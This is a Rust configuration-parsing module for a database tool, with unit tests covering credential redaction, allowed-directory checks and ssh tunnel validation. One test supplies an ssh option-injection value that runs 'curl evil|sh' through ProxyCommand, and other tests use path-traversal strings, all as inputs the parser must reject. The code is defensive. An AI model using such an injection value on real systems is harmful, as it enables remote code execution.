//! Config parsing: TOML text -> validated structures. Pure: no IO here;
//! the cli layer reads the file and passes an env lookup closure in.

use serde::Deserialize;
use std::collections::BTreeMap;

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Config {
    #[serde(default)]
    pub defaults: Defaults,
    #[serde(default)]
    pub connections: BTreeMap<String, Connection>,
}

#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Defaults {
    pub row_limit: Option<u64>,
    pub timeout_secs: Option<u64>,
    // Routing reads this via peek_defaults_format() BEFORE the semantic parse
    // (so a config error still routes by it); the field stays only so
    // deny_unknown_fields accepts the key here.
    #[allow(dead_code)]
    pub format: Option<String>,
}

// url/password_env are validated now, used by server engines in step 4+.
#[allow(dead_code)]
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Connection {
    pub engine: String,
    pub url: Option<String>,
    pub path: Option<String>,
    /// Name of the env variable holding the password; the value is never printed.
    pub password_env: Option<String>,
    /// Empty or absent = denied everywhere (fail closed).
    #[serde(default)]
    pub allowed_dirs: Vec<String>,
    pub row_limit: Option<u64>,
    pub timeout_secs: Option<u64>,
    pub validator: Option<Validator>,
    pub ssh: Option<Ssh>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Validator {
    pub allow_functions: Option<Vec<String>>,
    pub deny_functions: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Ssh {
    pub host: Option<String>,
    pub remote: Option<String>,
    pub control_persist: Option<String>,
}

#[derive(Debug)]
pub enum ConfigError {
    /// TOML syntax error or schema violation (unknown key, wrong type, ...).
    Invalid(String),
    /// `${VAR}` referenced in the config but the variable is not set.
    MissingEnvVar(String),
    /// `${VAR}` is set but its value is not valid UTF-8.
    NotUnicodeEnvVar(String),
    /// An allowed_dirs entry that is neither absolute nor a safe `~/` path
    /// (relative, or `~//...` whose remainder is rooted) — both fail-open.
    InvalidAllowedDir { alias: String, dir: String },
    /// `${VAR}` in an allowed_dirs entry: the environment is controlled by
    /// the calling agent, so substitution there would let it widen the scope.
    EnvVarInAllowedDir { alias: String, dir: String },
    /// `row_limit = 0` / `timeout_secs = 0`: zero would mean "no rows" /
    /// "every query times out" — never what anyone wants. Fail loud.
    ZeroValue { key: String },
    /// A `[connections.X.ssh]` section is present but `host` or `remote` is
    /// missing/empty — both are required to open a tunnel. `field` is the name.
    SshMissingField { alias: String, field: &'static str },
    /// An ssh tunnel was configured for a sqlite connection. SQLite is a local
    /// file; a port forward is meaningless (and would silently do nothing).
    SshWithSqlite { alias: String },
    /// An ssh `host`/`remote`/`control_persist` value is malformed or unsafe
    /// (e.g. an option-injection host after `${VAR}` substitution). Caught at
    /// parse (fail-fast) rather than as a runtime tunnel error.
    SshInvalid { alias: String, message: String },
}

/// Environment lookup, injected for purity (cli passes `std::env::var`).
pub type EnvLookup<'a> = &'a dyn Fn(&str) -> Result<String, std::env::VarError>;

/// Parse config text.
pub fn parse(text: &str, env: EnvLookup) -> Result<Config, ConfigError> {
    let value: toml::Value =
        toml::from_str(text).map_err(|e| ConfigError::Invalid(toml_message(&e, text)))?;
    // On the RAW value, before substitution: allowed_dirs must be literal.
    reject_env_vars_in_allowed_dirs(&value)?;
    let value = substitute(value, env)?;
    let config: Config = value
        .try_into()
        .map_err(|e: toml::de::Error| ConfigError::Invalid(toml_message(&e, text)))?;
    // Defense in depth below (the literal-only rule already bars env-driven
    // widening). A relative entry would canonicalize against cwd ("." =
    // allowed everywhere); a rooted remainder after `~/` would make join()
    // return the root itself ("~//" = allowed everywhere). Fail closed.
    for (alias, conn) in &config.connections {
        for dir in &conn.allowed_dirs {
            if !valid_allowed_dir(dir) {
                return Err(ConfigError::InvalidAllowedDir {
                    alias: alias.clone(),
                    dir: dir.clone(),
                });
            }
        }
    }
    reject_zero(config.defaults.row_limit, "defaults.row_limit")?;
    reject_zero(config.defaults.timeout_secs, "defaults.timeout_secs")?;
    for (alias, conn) in &config.connections {
        reject_zero(conn.row_limit, &format!("connections.{alias}.row_limit"))?;
        reject_zero(
            conn.timeout_secs,
            &format!("connections.{alias}.timeout_secs"),
        )?;
        validate_ssh(alias, conn)?;
    }
    Ok(config)
}

/// The raw `[defaults].format` string, read from a structural TOML parse
/// only — no substitution, no semantic validation. The cli resolves the
/// envelope-routing format from this BEFORE the full semantic parse, so a
/// config error (e.g. `row_limit = 0`) still routes its error envelope by
/// the configured format instead of defaulting to json/stdout. Returns None
/// if the TOML is malformed or the key is absent/non-string (routing then
/// falls back to the flag, then json).
pub fn peek_defaults_format(text: &str) -> Option<String> {
    toml::from_str::<toml::Value>(text)
        .ok()?
        .get("defaults")?
        .get("format")?
        .as_str()
        .map(str::to_string)
}

/// When a `[ssh]` section is present, `host` and `remote` are required (they
/// are `Option` only so the section can be parsed before this check), and the
/// engine must not be sqlite (a tunnel is meaningless for a local file).
fn validate_ssh(alias: &str, conn: &Connection) -> Result<(), ConfigError> {
    let Some(ssh) = &conn.ssh else {
        return Ok(());
    };
    let present = |v: &Option<String>| v.as_deref().is_some_and(|s| !s.trim().is_empty());
    if !present(&ssh.host) {
        return Err(ConfigError::SshMissingField {
            alias: alias.to_string(),
            field: "host",
        });
    }
    if !present(&ssh.remote) {
        return Err(ConfigError::SshMissingField {
            alias: alias.to_string(),
            field: "remote",
        });
    }
    if conn.engine == "sqlite" {
        return Err(ConfigError::SshWithSqlite {
            alias: alias.to_string(),
        });
    }
    // Strict format/safety validation, fail-fast (exit 3). Critically this
    // rejects an option-injection host (e.g. a `${VAR}` that expanded to
    // `-oProxyCommand=...`) before it can ever reach the ssh argv.
    let invalid = |message: String| ConfigError::SshInvalid {
        alias: alias.to_string(),
        message,
    };
    crate::tunnel::validate_host(ssh.host.as_deref().unwrap_or_default()).map_err(invalid)?;
    crate::tunnel::validate_remote(ssh.remote.as_deref().unwrap_or_default()).map_err(invalid)?;
    if let Some(cp) = &ssh.control_persist {
        crate::tunnel::validate_control_persist(cp).map_err(invalid)?;
    }
    Ok(())
}

/// Zero limits are footguns: row_limit = 0 returns nothing (looking like an
/// empty table), timeout_secs = 0 times every query out.
fn reject_zero(value: Option<u64>, key: &str) -> Result<(), ConfigError> {
    if value == Some(0) {
        return Err(ConfigError::ZeroValue {
            key: key.to_string(),
        });
    }
    Ok(())
}

/// `allowed_dirs` must be static literals: `${VAR}` there would let the
/// calling agent (who controls the environment) widen the scope at will,
/// e.g. "/srv/${P}" with P="" resolves to the parent "/srv/".
fn reject_env_vars_in_allowed_dirs(value: &toml::Value) -> Result<(), ConfigError> {
    let Some(connections) = value.get("connections").and_then(toml::Value::as_table) else {
        return Ok(());
    };
    for (alias, conn) in connections {
        let Some(dirs) = conn.get("allowed_dirs").and_then(toml::Value::as_array) else {
            continue;
        };
        for dir in dirs.iter().filter_map(toml::Value::as_str) {
            if dir.contains("${") {
                return Err(ConfigError::EnvVarInAllowedDir {
                    alias: alias.clone(),
                    dir: dir.to_string(),
                });
            }
        }
    }
    Ok(())
}

fn valid_allowed_dir(dir: &str) -> bool {
    use std::path::{Component, Path};
    // ".." anywhere (also in the absolute form) escapes the intended prefix.
    if Path::new(dir)
        .components()
        .any(|c| c == Component::ParentDir)
    {
        return false;
    }
    if dir == "~" {
        return true;
    }
    if let Some(rest) = dir.strip_prefix("~/") {
        // A rooted remainder or (on Windows) a drive prefix like "C:." makes
        // home.join(rest) ignore home entirely -> widened scope.
        return !Path::new(rest).has_root()
            && !Path::new(rest)
                .components()
                .any(|c| matches!(c, Component::Prefix(_)));
    }
    Path::new(dir).is_absolute()
}

/// toml::de::Error's Display embeds an excerpt of the offending source line —
/// which may contain credentials. Emit only the bare message + a line number,
/// with double-quoted spans redacted: schema errors echo the offending value
/// ('invalid type: string "secret"...'). Key names use backticks and survive.
fn toml_message(e: &toml::de::Error, text: &str) -> String {
    let msg = redact_quoted(e.message());
    match e.span() {
        Some(span) => {
            let line = text[..span.start.min(text.len())].matches('\n').count() + 1;
            format!("{msg} (at line {line})")
        }
        None => msg,
    }
}

fn redact_quoted(msg: &str) -> String {
    // Greedy: the value itself may contain a quote, so pairwise matching
    // would leave parts of it outside the redaction. Everything from the
    // first to the last quote goes; a lone quote redacts to the end.
    // Over-redacting is the safe direction, under-redacting is not.
    match msg.find('"') {
        None => msg.to_string(),
        Some(first) => {
            let last = msg.rfind('"').unwrap_or(first);
            let tail = if last > first { &msg[last + 1..] } else { "" };
            format!("{}\"...\"{tail}", &msg[..first])
        }
    }
}

/// group/other permission bits set -> warning text (pure; cli reads the mode).
pub fn permissions_warning(mode: u32) -> Option<String> {
    if mode & 0o077 != 0 {
        Some(format!(
            "config file is accessible by group/others (mode {:03o}); credentials may leak — run `chmod 600` on it",
            mode & 0o777
        ))
    } else {
        None
    }
}

/// `${VAR}` substitution in every string value, recursively.
fn substitute(value: toml::Value, env: EnvLookup) -> Result<toml::Value, ConfigError> {
    Ok(match value {
        toml::Value::String(s) => toml::Value::String(substitute_str(&s, env)?),
        toml::Value::Array(items) => toml::Value::Array(
            items
                .into_iter()
                .map(|v| substitute(v, env))
                .collect::<Result<_, _>>()?,
        ),
        toml::Value::Table(table) => toml::Value::Table(
            table
                .into_iter()
                .map(|(k, v)| Ok((k, substitute(v, env)?)))
                .collect::<Result<_, _>>()?,
        ),
        other => other,
    })
}

fn substitute_str(s: &str, env: EnvLookup) -> Result<String, ConfigError> {
    use std::env::VarError;
    let mut parts = s.split("${");
    let mut out = String::from(parts.next().unwrap_or(""));
    for part in parts {
        match part.find('}') {
            Some(end) if is_var_name(&part[..end]) => {
                let name = &part[..end];
                match env(name) {
                    Ok(val) => out.push_str(&val),
                    Err(VarError::NotPresent) => {
                        return Err(ConfigError::MissingEnvVar(name.to_string()))
                    }
                    Err(VarError::NotUnicode(_)) => {
                        return Err(ConfigError::NotUnicodeEnvVar(name.to_string()))
                    }
                }
                out.push_str(&part[end + 1..]);
            }
            // Not a well-formed ${NAME} — keep the text literally.
            _ => {
                out.push_str("${");
                out.push_str(part);
            }
        }
    }
    Ok(out)
}

fn is_var_name(s: &str) -> bool {
    !s.is_empty() && s.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn env_of(pairs: &[(&str, &str)]) -> impl Fn(&str) -> Result<String, std::env::VarError> {
        let map: HashMap<String, String> = pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();
        move |name: &str| map.get(name).cloned().ok_or(std::env::VarError::NotPresent)
    }

    const FULL: &str = r#"
        [defaults]
        row_limit = 1000
        timeout_secs = 30
        format = "json"

        [connections.prod]
        engine = "postgres"
        url = "postgres://nyet_ro@db.internal:5432/app"
        password_env = "PROD_DB_PASSWORD"
        allowed_dirs = ["~/Workspace/app"]
        row_limit = 500
        timeout_secs = 10

        [connections.prod.validator]
        allow_functions = ["pg_sleep"]
        deny_functions = ["my_scary_fn"]

        [connections.prod.ssh]
        host = "deploy@bastion.corp:22"
        remote = "db.internal:5432"
        control_persist = "15m"

        [connections.localdev]
        engine = "sqlite"
        path = "./dev.db"
        allowed_dirs = ["~/Workspace/app"]
    "#;

    #[test]
    fn full_config_parses() {
        let cfg = parse(FULL, &env_of(&[])).unwrap();
        assert_eq!(cfg.defaults.row_limit, Some(1000));
        assert_eq!(cfg.connections.len(), 2);
        let prod = &cfg.connections["prod"];
        assert_eq!(prod.engine, "postgres");
        // password_env holds the variable *name*, never its value.
        assert_eq!(prod.password_env.as_deref(), Some("PROD_DB_PASSWORD"));
        assert_eq!(
            prod.validator.as_ref().unwrap().allow_functions,
            Some(vec!["pg_sleep".to_string()])
        );
        assert_eq!(
            prod.ssh.as_ref().unwrap().host.as_deref(),
            Some("deploy@bastion.corp:22")
        );
        assert_eq!(
            cfg.connections["localdev"].path.as_deref(),
            Some("./dev.db")
        );
    }

    #[test]
    fn broken_toml_is_invalid() {
        assert!(matches!(
            parse("not = [valid", &env_of(&[])),
            Err(ConfigError::Invalid(_))
        ));
    }

    #[test]
    fn unknown_key_is_invalid() {
        let err = parse(
            "[connections.a]\nengine = \"sqlite\"\ntypo_key = 1",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::Invalid(msg) => assert!(msg.contains("typo_key"), "{msg}"),
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn env_substitution_works() {
        let cfg = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u:${PW}@h/db\"",
            &env_of(&[("PW", "s3cret")]),
        )
        .unwrap();
        assert_eq!(
            cfg.connections["a"].url.as_deref(),
            Some("postgres://u:s3cret@h/db")
        );
    }

    #[test]
    fn missing_env_var_is_hard_error() {
        let err = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"${NO_SUCH_VAR_XYZ}\"",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::MissingEnvVar(name) => assert_eq!(name, "NO_SUCH_VAR_XYZ"),
            other => panic!("expected MissingEnvVar, got {other:?}"),
        }
    }

    #[test]
    fn non_utf8_env_var_is_hard_error() {
        let env = |_: &str| {
            Err(std::env::VarError::NotUnicode(std::ffi::OsString::from(
                "garbage",
            )))
        };
        let err = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"${BAD_VAR}\"",
            &env,
        )
        .unwrap_err();
        match err {
            ConfigError::NotUnicodeEnvVar(name) => assert_eq!(name, "BAD_VAR"),
            other => panic!("expected NotUnicodeEnvVar, got {other:?}"),
        }
    }

    #[test]
    fn bad_allowed_dirs_are_rejected() {
        // Relative entries, rooted-remainder tilde entries and ".." are fail-open.
        for dir in [
            ".",
            "./app",
            "relative/path",
            "~//",
            "~//etc",
            "~/..",
            "~/../etc",
            "/abs/../etc",
        ] {
            let text = format!("[connections.a]\nengine = \"sqlite\"\nallowed_dirs = [\"{dir}\"]");
            let err = parse(&text, &env_of(&[])).unwrap_err();
            match err {
                ConfigError::InvalidAllowedDir { alias, dir: got } => {
                    assert_eq!(alias, "a");
                    assert_eq!(got, dir);
                }
                other => panic!("expected InvalidAllowedDir for {dir:?}, got {other:?}"),
            }
        }
        // Absolute and tilde forms pass.
        for dir in ["/abs/path", "~", "~/proj"] {
            let text = format!("[connections.a]\nengine = \"sqlite\"\nallowed_dirs = [\"{dir}\"]");
            assert!(parse(&text, &env_of(&[])).is_ok(), "{dir} should be valid");
        }
    }

    #[test]
    fn env_vars_in_allowed_dirs_are_rejected_before_substitution() {
        // The calling agent controls the environment: "/srv/${P}" with P=""
        // would resolve to the parent "/srv/". Literal paths only.
        for (dir, env) in [
            ("~/${X}", env_of(&[("X", "/etc")])),
            ("/srv/${P}", env_of(&[("P", "")])),
            ("/srv/${UNSET}", env_of(&[])), // rejected even if VAR is unset
        ] {
            let text = format!("[connections.a]\nengine = \"sqlite\"\nallowed_dirs = [\"{dir}\"]");
            let err = parse(&text, &env).unwrap_err();
            assert!(
                matches!(err, ConfigError::EnvVarInAllowedDir { dir: ref got, .. } if got == dir),
                "for {dir:?} got {err:?}"
            );
        }
    }

    #[cfg(windows)]
    #[test]
    fn drive_prefix_remainder_after_tilde_is_rejected() {
        // "C:." parses as Component::Prefix only on Windows; there
        // home.join("C:.") ignores home entirely.
        assert!(!valid_allowed_dir("~/C:."));
    }

    #[test]
    fn schema_error_does_not_leak_values_containing_quotes() {
        // The value itself contains a `"`: pairwise quote matching would
        // leave SUPERSECRET outside the redacted span.
        let err = parse(
            "[connections.a]\nengine = \"sqlite\"\nrow_limit = \"prefix\\\"SUPERSECRET\"",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::Invalid(msg) => {
                assert!(!msg.contains("SUPERSECRET"), "leaked: {msg}")
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
        // Direct check of the greedy redaction on a raw message.
        assert_eq!(
            redact_quoted(r#"invalid type: string "prefix"SUPERSECRET", expected u64"#),
            r#"invalid type: string "...", expected u64"#
        );
        // Lone quote: redact to the end (unclosed span may hold the value).
        assert_eq!(redact_quoted(r#"got "secret tail"#), r#"got "...""#);
        assert_eq!(redact_quoted("no quotes here"), "no quotes here");
    }

    #[test]
    fn schema_error_does_not_leak_values() {
        // Wrong-type schema errors echo the offending value in quotes;
        // it must be redacted (the value may be a credential).
        let err = parse(
            "[connections.a]\nengine = \"sqlite\"\nrow_limit = \"supersecret\"",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::Invalid(msg) => {
                assert!(!msg.contains("supersecret"), "leaked: {msg}")
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn toml_error_does_not_leak_source_text() {
        // Unterminated string: the offending line holds a credential; the
        // error message must not echo the source excerpt (threat model:
        // credentials never reach the LLM context).
        let err = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://user:supersecret@host/db\n",
            &env_of(&[]),
        )
        .unwrap_err();
        match err {
            ConfigError::Invalid(msg) => {
                assert!(!msg.contains("supersecret"), "leaked: {msg}")
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn malformed_placeholder_kept_literally() {
        let cfg = parse(
            "[connections.a]\nengine = \"postgres\"\nurl = \"${not closed\"",
            &env_of(&[]),
        )
        .unwrap();
        assert_eq!(cfg.connections["a"].url.as_deref(), Some("${not closed"));
    }

    #[test]
    fn zero_limits_are_rejected() {
        for (text, key) in [
            ("[defaults]\nrow_limit = 0", "defaults.row_limit"),
            ("[defaults]\ntimeout_secs = 0", "defaults.timeout_secs"),
            (
                "[connections.a]\nengine = \"sqlite\"\nrow_limit = 0",
                "connections.a.row_limit",
            ),
            (
                "[connections.a]\nengine = \"sqlite\"\ntimeout_secs = 0",
                "connections.a.timeout_secs",
            ),
        ] {
            match parse(text, &env_of(&[])).unwrap_err() {
                ConfigError::ZeroValue { key: got } => assert_eq!(got, key),
                other => panic!("expected ZeroValue for {key}, got {other:?}"),
            }
        }
        // 1 is fine.
        assert!(parse("[defaults]\nrow_limit = 1", &env_of(&[])).is_ok());
    }

    #[test]
    fn ssh_section_requires_host_and_remote() {
        // Missing host.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nremote = \"db:5432\"";
        match parse(text, &env_of(&[])).unwrap_err() {
            ConfigError::SshMissingField { alias, field } => {
                assert_eq!(alias, "a");
                assert_eq!(field, "host");
            }
            other => panic!("expected SshMissingField host, got {other:?}"),
        }
        // Present-but-empty host is also missing.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"  \"\nremote = \"db:5432\"";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
            ConfigError::SshMissingField { field: "host", .. }
        ));
        // Missing remote.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"deploy@bastion:22\"";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
            ConfigError::SshMissingField {
                field: "remote",
                ..
            }
        ));
    }

    #[test]
    fn ssh_option_injection_host_is_rejected_at_parse() {
        // RCE guard: a ${VAR} that expands to an ssh option must fail at config
        // parse (exit 3), before the value can reach the ssh argv.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"${BASTION}\"\nremote = \"db:5432\"";
        match parse(
            text,
            &env_of(&[("BASTION", "-oProxyCommand=sh -c \"curl evil|sh\"")]),
        )
        .unwrap_err()
        {
            ConfigError::SshInvalid { alias, .. } => assert_eq!(alias, "a"),
            other => panic!("expected SshInvalid, got {other:?}"),
        }
        // A malformed remote and a bad control_persist are also parse errors.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"bastion:22\"\nremote = \"db:notaport\"";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
            ConfigError::SshInvalid { .. }
        ));
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.ssh]\nhost = \"bastion:22\"\nremote = \"db:5432\"\n\
                    control_persist = \"fifteen\"";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
            ConfigError::SshInvalid { .. }
        ));
        // Port 0 (host and remote) is rejected at parse (ssh refuses it).
        for ssh in [
            "host = \"bastion:0\"\nremote = \"db:5432\"",
            "host = \"bastion:22\"\nremote = \"db:0\"",
        ] {
            let text = format!(
                "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                 [connections.a.ssh]\n{ssh}"
            );
            assert!(
                matches!(
                    parse(&text, &env_of(&[])).unwrap_err(),
                    ConfigError::SshInvalid { .. }
                ),
                "port 0 must be rejected: {ssh}"
            );
        }
    }

    #[test]
    fn ssh_is_rejected_for_sqlite() {
        let text = "[connections.a]\nengine = \"sqlite\"\npath = \"./x.db\"\n\
                    [connections.a.ssh]\nhost = \"deploy@bastion:22\"\nremote = \"db:5432\"";
        match parse(text, &env_of(&[])).unwrap_err() {
            ConfigError::SshWithSqlite { alias } => assert_eq!(alias, "a"),
            other => panic!("expected SshWithSqlite, got {other:?}"),
        }
    }

    #[test]
    fn permissions_warning_on_group_other_bits() {
        assert!(permissions_warning(0o100600).is_none());
        assert!(permissions_warning(0o100644).is_some());
        assert!(permissions_warning(0o100640).is_some());
        assert!(permissions_warning(0o100601).is_some());
    }
}
